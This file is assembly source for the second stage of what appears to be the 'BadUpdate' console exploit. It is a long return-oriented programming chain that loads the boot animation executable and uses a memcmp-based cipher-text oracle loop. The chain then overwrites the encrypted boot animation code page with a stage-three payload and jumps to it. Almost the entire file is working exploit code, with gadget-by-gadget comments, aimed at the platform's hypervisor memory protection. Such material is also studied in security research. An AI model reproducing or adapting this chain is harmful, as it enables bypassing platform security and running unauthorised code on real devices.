

# Compiler flags, must be set before any code or include directives:
.include "BuildConfig.asm"

# Include the header for the data segment file.
.include "BadUpdateExploit_Data_h.asm"

# Include additional files:
.include "Gadgets.asm"
.include "GetPayloadCipherText_Macros.asm"
.include "MemcpyCipherText.asm"

    .set overwrite_loop_gadget_data_size,   _cipher_text_overwrite_loop_end - _cipher_text_overwrite_loop
    

        # Pad the start of the chain to give the first few function calls additional stack space without having 
        # to worry about them passing the start of the ROP chain buffer and corrupting memory.
        .fill   second_stage_offset, 1, 0x00

        ###########################################################
        # Gadget N: transition from first stage ROP chain
        #
        #   -lwz    r1, 0(r1)
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   blr
        ###########################################################
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
    # second_stage_chain_address is offset by 8 to account for the displacement in the stack pivot gadget used to
    # jump here. To compensate I offset _second_stage_chain_start by 8 so all relative calculations using it are correct.
    _second_stage_chain_start = .
        
        ###########################################################
        # Gadget N: set LED color to indicate second stage has started
        #
        ###########################################################
        SET_LED (LED_COLOR_RED_1 | LED_COLOR_GREEN_1 | LED_COLOR_RED_2 | LED_COLOR_GREEN_2)
        
        ###########################################################
        # Gadget N: map flash so we can access the boot animation executable
        #
        ###########################################################
        CREATE_SYMLINK flash_symlink_mount, flash_symlink_path

        ###########################################################
        # Gadget N: call XexLoadImage and load bootanim.xex
        #
        #   r3 = xex file path
        #   r4 = flags
        #   r5 = version requirements (NULL)
        #   r6 = address to store module handle at
        ###########################################################

        # yeah this one's wierd, idk why, but doing this causes the pages to allocate in the same places... otherwise they don't. ok then.
        CALL_FUNC 11, XexLoadImage, R3H=0, R3L=flash_bootanim_path, R4H=0, R4L=0x40000008, R5H=0, R5L=0, R6H=0, R6L=bootanim_module_handle
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, bootanim_module_handle
        CALL_FUNC 1, XexUnloadImage, R3H=0, R3L=0x41414141

        CALL_FUNC 11, XexLoadImage, R3H=0, R3L=flash_bootanim_path, R4H=0, R4L=0x40000008, R5H=0, R5L=0, R6H=0, R6L=bootanim_module_handle
        
        ###########################################################
        # Gadget N: call MmGetPhysicalAddress to get physical address of boot animation code page
        #
        #   r3 = memory address of boot animation code page
        ###########################################################
        CALL_FUNC 11, MmGetPhysicalAddress, R3H=0, R3L=BootAnimCodePageAddress
        .fill   0x50, 1, 0x00
        .long   0x00000000, BootAnimCodePagePhysAddr    # r31 - address to store return value to
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store physical address of boot animation code page
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: update XexUnloadImage gadget data with the boot animation module handle
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, bootanim_module_handle
        
        ###########################################################
        # Gadget N: copy plain text oracle data
        #
        #   r3 = destination address
        #   r4 = source address
        #   r5 = size to copy
        ###########################################################
        CALL_FUNC 11, memcpy, R3H=0, R3L=abOracleData, R4H=0, R4L=BootAnimCodePageAddress, R5H=0, R5L=0x00000010
        
        ###########################################################
        # Gadget N: unload boot animation
        #
        #   r3 = boot animation module handle (to be updated by previous gadgets)
        ###########################################################
        CALL_FUNC 1, XexUnloadImage, R3H=0, R3L=0x41414141
        
        ###########################################################
        # Gadget N: call XPhysicalAlloc and allocate cipher text scratch memory
        #
        #   r3 = allocation size
        #   r4 = requested address = MAXULONG_PTR
        #   r5 = alignment
        #   r6 = page flags: PAGE_READWRITE | MEM_LARGE_PAGES
        ###########################################################
        CALL_FUNC 11, XPhysicalAlloc, R3H=0, R3L=0x00010080, R4H=0, R4L=0xFFFFFFFF, R5H=0, R5L=0x00000080, R6H=0, R6L=0x20000004
        .fill   0x50, 1, 0x00
        .long   0x00000000, pPayloadCipherText          # r31 - address to store allocation address at
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store allocation address
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for MmGetPhysicalAddress call
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, MmGetPhysicalAddress    # r31 - function address to call
        .long   call_func_dispatch                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call MmGetPhysicalAddress and get physical address of pPayloadCipherText allocation
        #   Note: r3 still contains the allocation address
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, PayloadCipherTextPhysAddr   # r31 - address to store physical address at
        .long   stw_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store physical address of allocation
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        #DBG_BREAK
        
        ###########################################################
        # Gadget N: copy cipher text buffer pointers
        #
        ###########################################################
        WRITE_PTR_TO_ADDR pPayloadCipherText2, pPayloadCipherText
        WRITE_PTR_TO_ADDR pPayloadCipherTextSizeValue, pPayloadCipherText
        WRITE_PTR_TO_ADDR PayloadCipherTextSizeValuePhysAddr, PayloadCipherTextPhysAddr
        
        ###########################################################
        # Gadget N: update pPayloadCipherTextSizeValue/PayloadCipherTextSizeValuePhysAddr by 0x20
        #
        ###########################################################
        LOAD_ADD_STORE pPayloadCipherTextSizeValue, 0x20
        LOAD_ADD_STORE PayloadCipherTextSizeValuePhysAddr, 0x20
        
        ###########################################################
        # Gadget N: offset pPayloadCipherText2 by 0x80
        #
        ###########################################################
        LOAD_ADD_STORE pPayloadCipherText2, 0x80
        
        #DBG_BREAK
        
        ###########################################################
        # Gadget N: get the cipher text for the boot animation oracle data and code we want to write to memory
        #
        ###########################################################
        .include "GetPayloadCipherText.asm"
        
        ###########################################################
        # Gadget N: allocate virtual memory for secondary overwrite loop gadget buffer
        #
        #   r3 = pointer to allocation address (NULL)
        #   r4 = pointer to size variable
        #   r5 = allocation type = MEM_COMMIT
        #   r6 = page protection = PAGE_READWRITE
        #   r7 = memory region type
        ###########################################################
        #CALL_FUNC 11, NtAllocateVirtualMemory, R3H=0, R3L=overwrite_loop_secondary_buffer_address, R4H=0, R4L=overwrite_loop_secondary_buffer_size, R5H=0, R5L=0x00001000, R6H=0, R6L=0x00000004, R7H=0, R7L=0
        
        ###########################################################
        # Gadget N: setup overwrite_loop_stack_address[0] to point to _cipher_text_overwrite_loop in primary buffer
        #
        ###########################################################
        WRITE_PTR_TO_ADDR overwrite_loop_stack_address, second_stage_chain_address
        LOAD_ADD_STORE overwrite_loop_stack_address, (_cipher_text_overwrite_loop - _second_stage_chain_start) + 8      # +8 to account for displacement in stack pivot gadget
        
        ###########################################################
        # Gadget N: setup overwrite_cipher_text_stack_address to point to _copy_and_execute_stage_three
        #
        ###########################################################
        WRITE_PTR_TO_ADDR overwrite_cipher_text_stack_address, second_stage_chain_address
        LOAD_ADD_STORE overwrite_cipher_text_stack_address, (_copy_and_execute_stage_three - _second_stage_chain_start) + 8     # +8 to account for displacement in stack pivot gadget
        
        ###########################################################
        # Gadget N: fill in missing values for overwrite loop that are common between primary/secondary gadget buffers
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (12f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (13f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, 5f - _second_stage_chain_start, overwrite_cipher_text_stack_address
        
        WRITE_PTR_TO_ADDR arithmetic_scratch1, pPayloadCipherText
        LOAD_ADD_STORE arithmetic_scratch1, 0x10
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (13f + cf_r4_offset) - _second_stage_chain_start, arithmetic_scratch1
        
        ###########################################################
        #
        # Secondary overwrite loop setup
        #
        ###########################################################
        
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, 7f - _second_stage_chain_start, overwrite_loop_stack_address    # stack pivot address for exiting the secondary overwrite loop
        
            # setup overwrite_loop_stack_address[1] to point to _cipher_text_overwrite_loop in secondary buffer
            WRITE_PTR_TO_ADDR overwrite_loop_stack_address + 4, overwrite_loop_secondary_buffer_address
            LOAD_ADD_STORE overwrite_loop_stack_address + 4, second_stage_offset + 8        # +8 to account for displacement in stack pivot gadget
            
            # source address for gadget data save:
            WRITE_PTR_TO_ADDR arithmetic_scratch1, second_stage_chain_address
            LOAD_ADD_STORE arithmetic_scratch1, _cipher_text_overwrite_loop - _second_stage_chain_start
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (22f + cf_r4_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # destination address for gadget data save = overwrite_loop_secondary_buffer_address + (secondary_overwrite_loop_max_size / 2)
            WRITE_PTR_TO_ADDR arithmetic_scratch1, overwrite_loop_secondary_buffer_address
            LOAD_ADD_STORE arithmetic_scratch1, secondary_overwrite_loop_max_size / 2
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (22f + cf_r3_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # source address for gadget data restore:
            WRITE_PTR_TO_ADDR arithmetic_scratch1, second_stage_chain_address
            LOAD_ADD_STORE arithmetic_scratch1, _overwrite_loop_gadget_data - _second_stage_chain_start
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (18f + cf_r4_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # destination address for gadget data restore:
            WRITE_PTR_TO_ADDR arithmetic_scratch1, second_stage_chain_address
            LOAD_ADD_STORE arithmetic_scratch1, _cipher_text_overwrite_loop - _second_stage_chain_start
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (18f + cf_r3_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            ###########################################################
            # Gadget N: save gadget data below into secondary overwrite buffer staging area
            #
            ###########################################################
            CALL_FUNC 22, memcpy, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=overwrite_loop_gadget_data_size
            
        ###########################################################
        #
        # Primary overwrite loop setup
        #
        ###########################################################
        
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, 1f - _second_stage_chain_start, overwrite_loop_stack_address        # stack pivot address for entering the primary overwrite loop
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, 7f - _second_stage_chain_start, overwrite_loop_stack_address + 4    # stack pivot address for exiting the primary overwrite loop
        
            # source address for gadget data save:
            WRITE_PTR_TO_ADDR arithmetic_scratch1, second_stage_chain_address
            LOAD_ADD_STORE arithmetic_scratch1, _cipher_text_overwrite_loop - _second_stage_chain_start
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (22f + cf_r4_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # destination address for gadget data save:
            WRITE_PTR_TO_ADDR arithmetic_scratch1, second_stage_chain_address
            LOAD_ADD_STORE arithmetic_scratch1, _overwrite_loop_gadget_data - _second_stage_chain_start
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (22f + cf_r3_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # source address for gadget data restore = overwrite_loop_secondary_buffer_address + (secondary_overwrite_loop_max_size / 2)
            WRITE_PTR_TO_ADDR arithmetic_scratch1, overwrite_loop_secondary_buffer_address
            LOAD_ADD_STORE arithmetic_scratch1, secondary_overwrite_loop_max_size / 2
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (18f + cf_r4_offset) - _second_stage_chain_start, arithmetic_scratch1
            
            # destination address for gadget data restore = overwrite_loop_secondary_buffer_address + second_stage_offset
            WRITE_PTR_TO_ADDR arithmetic_scratch1, overwrite_loop_secondary_buffer_address
            LOAD_ADD_STORE arithmetic_scratch1, second_stage_offset
            WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (18f + cf_r3_offset) - _second_stage_chain_start, arithmetic_scratch1
        
        
        
        
        ###########################################################
        # Gadget N: save overwrite loop gadget data
        #
        ###########################################################
        CALL_FUNC 22, memcpy, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=overwrite_loop_gadget_data_size
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   stack_pivot                         # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: stack pivot into the loop
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
1:      .long   0x41414141              # stack address for the start of the loop to pivot to

        # Align the stack to a 16 byte alignment. On dev builds XexLoadImage will print library info for the module
        # and requires 8 byte alignment for parameters.
        .align 4
        
        # Note: this loop cannot use any gadgets/functionality that requires a base address outside of the GET_STACK_POINTER
        # macro, as it will be executed from two different memory locations.
        
_cipher_text_overwrite_loop:
        
        ###########################################################
        # Gadget N: transition from stack pivot
        #
        #   -lwz        r1, 0(r1)
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   blr
        ###########################################################
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call XexLoadImage and load the boot animation
        #
        #   r3 = xex file path
        #   r4 = flags
        #   r5 = version requirements (NULL)
        #   r6 = address to store module handle at
        ###########################################################

        SET_LED (LED_COLOR_RED_3 | LED_COLOR_GREEN_3 | LED_COLOR_RED_4 | LED_COLOR_GREEN_4)
        CALL_FUNC 11, XexLoadImage, R3H=0, R3L=flash_bootanim_path, R4H=0, R4L=0x40000008, R5H=0, R5L=0x00000000, R6H=0, R6L=bootanim_module_handle
        
        ###########################################################
        # Gadget N: setup source and dest pointers for MEMCPY_CIPHER_TEXT macro
        #
        ###########################################################
        WRITE_PTR_TO_ADDR memcpy_cipher_text_dst_addr, PayloadCipherTextPhysAddr
        LOAD_ADD_STORE memcpy_cipher_text_dst_addr, 0x10
        WRITE_PTR_TO_ADDR memcpy_cipher_text_src_addr, BootAnimCodePagePhysAddr
        
        ###########################################################
        # Gadget N: get the cipher text for the boot animation at the target write address
        #
        ###########################################################
        MEMCPY_CIPHER_TEXT memcpy_cipher_text_dst_addr, memcpy_cipher_text_src_addr, 0x10
        
        ###########################################################
        # Gadget N: flush cache for the cipher text we just read.
        #
        #   r3 = base address for cache flush
        #   r4 = cache size to flush
        ###########################################################
        CALL_FUNC 12, KeFlushCacheRange, R3H=0, R3L=0x41414141, R4H=0, R4L=0x00000080
        
        ###########################################################
        # Gadget N: compare the cipher text at the target write address to the cipher text for the oracle data we captured earlier
        #
        #   r3 = cipher text for the oracle data
        #   r4 = cipher text for the current iteration
        #   r5 = number of bytes to compare
        ###########################################################
        CALL_FUNC 13, memcmp, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=0x00000010
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_30              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: setup for next gadget
        #
        #   addi    r1, r1, 0x70
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, memcmp_if_call_ptr - mul_r3_4_lwzx_r11__disp        # r30 - pointer to gadget array
        .long   0x00000000, arithmetic_scratch1                                 # r31 - pointer to scratch variable
        .long   stw_r30_on_r31                                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store memcmp_if_call_ptr pointer into scratch variable
        #
        #   stw     r30, 0(r31)
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x00000000                                                  # r30 - displacement for mul_r3_4_lwzx_r11 gadget
        .long   0x00000000, arithmetic_scratch1 - load_add_store_r11_r30_on_r31__disp   # r31 - scratch variable containing pointer to gadget array
        .long   load_add_store_r11_r30_on_r31                                           # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: set r11 to point to gadget array for memcmp result
        #
        #   lwz     r11, 0xC(r31)
        #   add     r11, r30, r11
        #   stw     r11, 0xC(r31)
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030              # r30
        .long   0x31313131, 0x31313131              # r31
        .long   clamp_r3                            # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: if (memcmp(...) == 0) r3=0 else r3=1
        #
        #   cmplwi  r3, 0
        #   li      r3, 0
        #   beq     loc_817F031C
        #       li      r3, 1
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, mul_r3_4_lwzx_r11       # r31 - next gadget address
        .long   call_func_dispatch
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call next gadget
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, read_file_scratch       # r31 - scratch address to store gadget address to
        .long   stw_r3
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load gadget address to handle memcmp result
        #
        #   slwi    r10, r3, 2
        #   addi    r11, r11, -0x5EAC
        #   lwzx    r3, r10, r11
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: store gadget address to scratch variable
        #
        #   stw     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, read_file_scratch       # r31 - scratch address to read gadget address from
        .long   call_ptr_off_r31                    # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: call gadget address
        #
        #   lwz     r11, 0(r31)
        #   mtctr   r11
        #   bctrl
        ###########################################################
        
        ###########################################################
        # Gadget N: if (r3 != 0) { do large epilogue and continue } else { do short epilogue and stack pivot }
        #
        ###########################################################
        
5:          .long   0x41414141                  # target stack pivot address
            .long   0x00000000
        
            ###########################################################
            # Gadget N: stack pivot to the overwrite section
            #
            #   lwz     r1, 0(r1)
            #   -lwz    r12, -8(r1)
            #   -mtlr   r12
            #   -blr
            ###########################################################
            
        ###########################################################
        # Gadget N: setup for next gadget
        #
        #   addi    r1, r1, 0x70
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r30, -0x18(r1)
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        # Epilogue data for intertwined __restgprlr_30 for else case (+0x8):
        .fill   0x58 - 8, 1, 0x00
        .long   0x30303030, 0x30303030                  # r30
        .long   0x00000000, bootanim_module_handle      # r31 - address of bootanim_module_handle
        .long   lwz_r3                                  # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load value of bootanim_module_handle into r3
        #
        #   lwz     r3, 0(r31)
        #   addi    r1, r1, 0x60
        #   lwz     r12, var_8(r1)
        #   mtlr    r12
        #   ld      r31, var_10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, XexUnloadImage      # r31 - function address to call
        .long   call_func_dispatch              # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: unload boot animation
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131          # r31
        .long   __restgprlr_31                  # lr
        .long   0x00000000
        
        SET_LED (LED_COLOR_RED_1 | LED_COLOR_GREEN_1 | LED_COLOR_RED_2 | LED_COLOR_GREEN_2)
        
        ###########################################################
        # Gadget N: copy loop gadget data
        #
        ###########################################################
        CALL_FUNC 18, memcpy, R3H=0, R3L=0x41414141, R4H=0, R4L=0x41414141, R5H=0, R5L=overwrite_loop_gadget_data_size
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131          # r31
        .long   stack_pivot                     # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: stack pivot back to the start of the loop
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
7:      .long   0x41414141              # stack address for the start of the overwrite loop

_cipher_text_overwrite_loop_end:
        
        # Align the stack to a 16 byte alignment.
        .align 4
        
_copy_and_execute_stage_three:

        ###########################################################
        # Gadget N: transition from stack pivot
        #
        #   -lwz    r1, 0(r1)
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   blr
        ###########################################################
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        #DBG_BREAK
        
        ###########################################################
        # Gadget N: setup source and dest pointers for MEMCPY_CIPHER_TEXT macro
        #
        ###########################################################
        WRITE_PTR_TO_ADDR memcpy_cipher_text_dst_addr, BootAnimCodePagePhysAddr
        WRITE_PTR_TO_ADDR memcpy_cipher_text_src_addr, PayloadCipherTextPhysAddr
        LOAD_ADD_STORE memcpy_cipher_text_src_addr, 0x80
        
        ###########################################################
        # Gadget N: fill in gadget data for HvxFlushDCacheRange call
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (12f + cf_r3_offset) - _second_stage_chain_start, BootAnimCodePagePhysAddr
        
        ###########################################################
        # Gadget N: overwrite the boot animation with the cipher text for stage three
        #
        ###########################################################
        MEMCPY_CIPHER_TEXT memcpy_cipher_text_dst_addr, memcpy_cipher_text_src_addr, 0x10000
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131                  # r31
        .long   __restgprlr_31                          # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: flush cache for encrypted address range we overwrote
        #
        #   r3 = encrypted address of boot animation code
        #   r4 = size of data to flush
        ###########################################################
        CALL_FUNC 11, KeFlushCacheRange, R3H=0, R3L=BootAnimCodePageAddress, R4H=0, R4L=0x00010000
        
        ###########################################################
        # Gadget N: flush cache for unencrypted address range we overwrote
        #
        #   r3 = unencrypted physical address of boot animation code
        #   r4 = size of data to flush
        ###########################################################
        CALL_FUNC 12, HvxFlushDCacheRange, R3H=0, R3L=0x41414141, R4H=0, R4L=0x00010000

        # this section replicates exiting from an XamTask. I know it's messy and uncommented, but I'll clean it up later. Maybe.

        CALL_FUNC 11, 0x81a72b34, R3H=0xffffffff, R3L=0x81b4af5c, R4H=0, R4L=0
        .fill   0x50, 1, 0x00
        .long   0x00000000, 0x81b4af60    # r31 - address to store return value to
        .long   stw_r3                                  # lr
        .long   0x00000000

        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, 0x43D9A268
        CALL_FUNC 1, 0x81964c78, R3H=0, R3L=0x41414141, R4H=0, R4L=0

        CALL_FUNC 11, memset, R3H=0, R3L=0x43D9A290, R4H=0, R4L=0, R5H=0, R5L=0x4

        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r4_offset) - _second_stage_chain_start, 0x81b4af60
        CALL_FUNC 1, 0x81a72b44, R3H=0xffffffff, R3L=0x81b4af5c, R4H=0, R4L=0x41414141
        
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (22f + cf_r3_offset) - _second_stage_chain_start, 0x81b4af58
        CALL_FUNC 22, 0x816ba6b0, R3H=0, R3L=0x81b4af58, R4H=0, R4L=0x4, R5H=0, R5L=0x0, R6H=0, R6L=0x0, R7H=0, R7L=new_task_attributes

        CALL_FUNC 1, 0x800750d0, R3H=0, R3L=1
        
        WRITE_PTR_TO_ADDR pPayloadCipherText, 0x7A13FF2C
        LOAD_ADD_STORE pPayloadCipherText, 0x8c
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        CALL_FUNC 1, 0x80070138, R3H=0, R3L=0x801B538c
        
        WRITE_PTR_TO_ADDR pPayloadCipherText, 0x7A13FF2C
        LOAD_ADD_STORE pPayloadCipherText, 0x88
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        CALL_FUNC 1, memset, R3H=0, R3L=0x801B5388, R4H=0, R4L=0, R5H=0, R5L=0x1
        
        WRITE_PTR_TO_ADDR pPayloadCipherText, 0x7A13FF2C
        LOAD_ADD_STORE pPayloadCipherText, 0x8c
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        CALL_FUNC 1, 0x8007018c, R3H=0, R3L=0x801B538c, R4H=0, R4L=1
        
        #CALL_FUNC 1, 0x8007018c, R3H=0, R3L=0x801B53be, R4H=0, R4L=1

        WRITE_PTR_TO_ADDR pPayloadCipherText, 0x7A13FF2C
        LOAD_ADD_STORE pPayloadCipherText, 0xFFFFFD00
        LOAD_ADD_STORE pPayloadCipherText, 0x18
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        CALL_FUNC 1, memset, R3H=0, R3L=0x801B5018, R4H=0, R4L=1, R5H=0, R5L=0x1

        WRITE_PTR_TO_ADDR pPayloadCipherText, 0x7A13FF2C
        LOAD_ADD_STORE pPayloadCipherText, 0xFFFFFE00
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, pPayloadCipherText
        CALL_FUNC 1, 0x80065be8, R3H=0, R3L=0x801B5100, R4H=0, R4L=1
        
        CALL_FUNC 1, 0x81a72314, R3H=0, R3L=0, R4H=0, R4L=0x10000, R5H=0, R5L=0, R6H=0, R6L=0x81725308, R7H=0, R7L=BootAnimCodePageAddress
        
        SET_LED (LED_COLOR_RED_1 | LED_COLOR_GREEN_1 | LED_COLOR_RED_3 | LED_COLOR_GREEN_3)
        
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, 0x7A15FE0C
        CALL_FUNC 1, 0x816B9668, R3H=0, R3L=0x41414141
        
        # this is BAD. It only works because of caching (seemingly). Need to fix!
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, second_stage_chain_address, (1f + cf_r3_offset) - _second_stage_chain_start, bootanim_module_handle
        CALL_FUNC 1, XexUnloadImage, R3H=0, R3L=0x41414141
        CALL_FUNC 11, 0x81a722f4, R3H=0, R3L=0

        .fill   0x50, 1, 0x00
        .long   0x00000000, BootAnimCodePageAddress     # r31 - function address to call
        .long   call_func_dispatch                      # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: ~28,000 gadgets later we finally made it... call stage three
        #
        #   mtctr   r31
        #   bctrl
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        # TODO: trap in case we ever return
        
_overwrite_loop_gadget_data:
        
        # Space to store the overwrite loop gadget data.
        .fill   overwrite_loop_gadget_data_size, 1, 0x00
        
        
        
# Include the data segment file so that all the EXPLOIT_DATA addresses are calculated correctly. The
# data contained in this file will be compiled into the second stage payload but ignored.
.include "BadUpdateExploit_Data.asm"

# Secret symbol table:
.long   0x69696969
.long   second_stage_chain_address
.long   overwrite_loop_stack_address
.long   _overwrite_loop_gadget_data - _second_stage_chain_start
.long   overwrite_loop_gadget_data_size
.long   _cipher_text_overwrite_loop - _second_stage_chain_start
.long   overwrite_loop_secondary_buffer_address
